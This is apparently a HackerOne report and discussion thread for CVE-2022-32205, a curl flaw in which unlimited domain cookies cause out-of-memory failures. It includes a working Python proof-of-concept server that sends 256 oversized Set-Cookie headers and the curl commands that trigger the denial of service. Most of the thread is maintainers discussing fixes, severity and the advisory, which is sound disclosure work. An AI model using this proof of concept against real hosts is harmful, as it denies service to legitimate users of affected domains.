title: CVE-2022-32205: Set-Cookie denial of service

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool for doing internet transfers

vulnerability_information:
## Summary:
Curl fails to limit the number of cookies that can be set by a single host/domain. It can easily lead to a situation where constructing the request towards a host will end up consuming more than `DYN_HTTP_REQUEST` memory, leading to instant `CURLE_OUT_OF_MEMORY`.

Any host in a given domain can target any other hosts in the same domain by using domain cookies. The attack works from both `HTTP` and `HTTPS` and from unprivileged ports.

## Steps To Reproduce:
  1. Run the following python web server:
```
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        for i in range(0,256):
            self.send_header("Set-Cookie", "f{}={}; Domain=hax.invalid".format(i, "A" * 4092))
        self.end_headers()

if __name__ == "__main__":
    webServer = HTTPServer(("127.0.0.1", 9000), MyServer)
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass
    webServer.server_close()
 ```
  2.  `curl -c cookie.txt -b cookie.txt --connect-to evilsite.hax.invalid:80:127.0.0.1:9000 http://evilsite.hax.invalid/`
  3.  `curl -c cookie.txt -b cookie.txt --connect-to targetedsite.hax.invalid:80:127.0.0.1:9000 http://targetedsite.hax.invalid/`

This is CWE-770: Allocation of Resources Without Limits or Throttling

# Remediation ideas
The cookie matching being as complicated as it is makes it a bit hard to create a fix that always works fine. The request inhabits other headers as well as the cookies, so the amount of storage available for the cookies also varies per request.

One relatively "easy" way to mitigate this would be to limit the amount of domain cookies a domain can have. But what should be done if  `Set-Cookie` would go over this limit? Maybe flush the oldest cookies?

## Impact

Denial of service

weakness.name: Allocation of Resources Without Limits or Throttling

activities.message:
The remediation idea only considers the scenario where another host in the same domain targets another. An attacker being able to host content on the same host (from a different port) can easily perform this attack as well, in which case limit to domain cookies would not help.

Some generic solution to this issue would be more desirable.
The denial of service is obviously against the whole domain, `HTTP` or `HTTPS`.

Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can!

This is an interesting challenge that I have no clear straight forward fix for.

libcurl has a maximum allowed size limit for the outgoing HTTP request (1MB), which is there to stop insanity and prevent malicious tricks. The limit is arbitrarily picked but I don't think that choice is the problem here.

Adding a ridiculous amount of cookies is just one way it can reach this limit. I can imagine that you can reach it via other means as well, and especially in various combinations.

Sure, we can (should?) probably limit the number of cookies to accept for a specific domain, and I believe browsers do that. The question of course becomes *how* to limit them and what cookies to yank in which order when the buckets are filled up. I believe the RFC is not really helpful with that - and I know there have been past (never adopted) proposals for introducing cookie priorities etc for this purpose.

The fact that one subdomain can ruin cookies for a "sister domain" is a known attack that is documented even in the cookie RFC. Maybe not exactly in this `CURLE_OUT_OF_MEMORY`-style way, but still.

Maybe it would be helpful to find out what Chromium and Firefox do in situations where too many cookies are introduced? If I'd have to guess they'll likely drop the oldest (either by creation date or modification date) entries. Perhaps https://en.wikipedia.org/wiki/Cache_replacement_policies#Simple_recency-based_policies could act as inspiration?

One hacky way to implement the least-recently-updated purging strategy would be to re-insert the most recently modified cookie to the head of the list. When adding a new cookie, see if the limit has been reached, and if it has drop the last entry from the list. This code would for course need to use the host/domain matching routine used for picking a cookie for specific host. The actual direction this would need to work depends on the way the code currently adds nodes (I didn't check, sorry). If it adds to the bottom then it'd need to move used nodes to the bottom and remove "first" matching entry. 

I'm not sure if this would be sufficient however.

Some more thoughts: If this would be fixed like this, it would still allow hosts in the same domain to "purge" legitimate cookies of another one. It would still be an improvement against the current situation where no request can be sent at all. Such "cookie purging attack" would also need to be active, whereas currently just a single malicious HTTP responsey is needed to block access to domain completely.

The "cookie drain" attack is exactly the kind I spoke of, which has no real mitigation and is a reason sites won't redirect to (uncontrolled) "sister domains" - which is also subsequently why this described issue is unlikely to be possible to use much to do harm in real world sites.

In all it can be said that cookie spec has some real issues on several areas, and as with many technologies related to web the reason is that this spec has developed over time organically while trying to maintain (some) level of support with the earlier specifications. Sometimes I think it's miracle things work at all as well as they do.

I think the reasonable solution here might consist of:

1. Limiting the amount of cookies to some value `MAX_COOKIES`
2. Ensuring that `MAX_COOKIES` * (`MAX_NAME` + sizeof(typical cookie attributes)) + sensible_size_reserved_for_other_headers <= `DYN_HTTP_REQUEST`

Browsers seem to limit the number of cookies:
Google Chrome 180
Firefox 150
Opera 180
Android 50
(This is from totally unauthoritative source https://www.tutorialspoint.com/What-is-the-maximum-size-of-a-web-browser-s-cookies-value though)

So `MAX_COOKIES` of 180 would be a quite safe bet. This would mean around 7xxKB for the cookies max. This would leave still sensible area for other headers with the current `DYN_HTTP_REQUEST`, I think.

> Limiting the amount of cookies to some value MAX_COOKIES

It's probably more complicated than so. I mean, exactly which cookies would `MAX_COOKIES` count? Easiest would be to limit the sending to that amount, but I'm not sure that's the ideal solution.

> more complicated than so

Ugh, I see what you mean: Setting a domain cookie can affect limit of many hosts within that domain. So it might end up needing to purge cookies for many of them. The logic to count and maintain the limit gets awfully complicated if done on "adding". 

Indeed at sending it would be easier. It'd still need a way to select cookies to use, which is somewhat messy.

What a headache.

I've toyed with implementing the Cookie Policy as outlined in the draft RFC, and have mostly given up (and submitted the accept/decline 100-headers part as a separate PR) on finding any reasonable way to do this which makes sense with default values without the need for user fiddling.

I have two thoughts:
1. Let's set an arbitrary cap on how many cookies we send in a single request. I think 150. Simply the first 150 that match.
2. Let's limit the max length of the single cookie header curl can send. Apache apparently accepts 8K request headers so maybe cap the cookies when we reach that limit before the cap above?
Not saying we need to go exactly this route, but if we do then the attached patch seems to do it. I have to tests verifying.

This is a possible DOS on a client using libcurl, but it takes an active attacker, it requires a "sister domain" setup and it requires that the site you attack uses this totally bad redirect to a breached/MITMed sister domain. That requirement makes me want to say that this is a Low severity vulnerability. It is just not very likely to be feasible.
Should we perhaps consider some kind of cap on number of accepted `Set-Cookie:` headers in a single response too?
Or maybe maximum number of allowed cookies in a single response.

The current patch appears to fix it for me.

I think some limit to setting cookies per request would be a good idea. The easiest would be to just have some upper ceiling for `Set-Cookie:` per request indeed, but it could be something fancier. Anything fancier gets complicated fast though, so I don't know if that's worth the trouble.

I've also pondered on maybe setting an forced expiry time (like 10 seconds into the future) on the cookies that are outside the cut in these situations, as a way to force them to get cleaned out faster in one of these "overload situations"

I think we should limit the number accepted `Set-Cookie:` headers as well as capping the cookie response. For the final patch though, `MAX_COOKIE_AMOUNT` is a too generic name since it makes it sound like the size of the cookie and not the number of cookies.

I'm not sure that artificially expiring cookies is all too wise without taking the expiration of the cookies inside the cap into consideration.
Here's an updated version. I updated the define name and I implemented a cap on number of accepted `Set-Cookie: headers in a single response (also tested in a new test not shown here).
I just felt it would be *more* wrong to use a larger type when it never needs to store a value larger than 50.
We could fix that with documentation specifying in the comment for MAX_SET_COOKIE_AMOUNT that if altered it must be < 255. Additionally it could be made an assertion in  `Curl_cookie_getlist()`
Good points. I'll do both.
The current patch set iteration.

That works, too. Looking good to me.

I like when someone cares about not wasting extra bytes :D
First advisory draft.
Looking good to me.

Since I accidentally but stupidly committed a draft version of the advisory for this issue to the master branch of the curl web site git repository a few days ago (only to realize it today). We have decided to speed up the release process and instead do it on June 27. I'm very sorry for this.

Thanks for your work. The actual monetary reward part for this issue is managed by the [Internet Bug Bounty](https://hackerone.com/ibb) so the curl project itself therefor sets the reward amount to **zero USD**. If you haven't already, please submit your reward request to them and refer back to this issue.
